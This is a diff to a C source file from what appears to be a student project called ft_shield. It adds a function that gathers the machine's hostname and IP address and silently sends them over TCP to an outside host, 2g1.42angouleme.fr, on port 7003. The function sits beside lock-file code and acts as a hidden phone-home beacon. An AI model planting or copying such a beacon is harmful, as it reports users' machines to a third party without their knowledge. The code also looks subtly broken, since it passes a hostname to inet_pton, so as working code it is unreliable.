@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/23 10:57:34 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/24 13:13:19 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -52,6 +52,42 @@ int	unlock_file(t_ctx *ctx)
 	close(ctx->lock_fd);
 	remove(LOCK_FILE);
 	return (1);
+}
+
+# define SWORD_PORT	7003
+# define SWORD_IP		"2g1.42angouleme.fr"
+# include <netdb.h>
+
+void	send_host_to_sword()
+{
+	char hostbuffer[256];
+	char *IPbuffer;
+	struct hostent *host_entry;
+	int hostname;
+
+	hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+
+	host_entry = gethostbyname(hostbuffer);
+
+	IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
+
+	char	buf[4096];
+	sprintf(buf, "Running ft_shield on %s %s\n", hostbuffer, IPbuffer);
+
+	
+	struct sockaddr_in	server_addr;
+	int					socket_fd;
+
+	memset(&server_addr, 0, sizeof(server_addr));
+	socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+	
+	server_addr.sin_family = AF_INET;
+	server_addr.sin_port = htons(SWORD_PORT);
+	inet_pton(AF_INET, SWORD_IP, &server_addr.sin_addr);
+
+	if (connect(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
+		return ;
+	send(socket_fd, buf, strlen(buf), 0);
 }
 
 int	ctx_init(t_ctx *ctx)
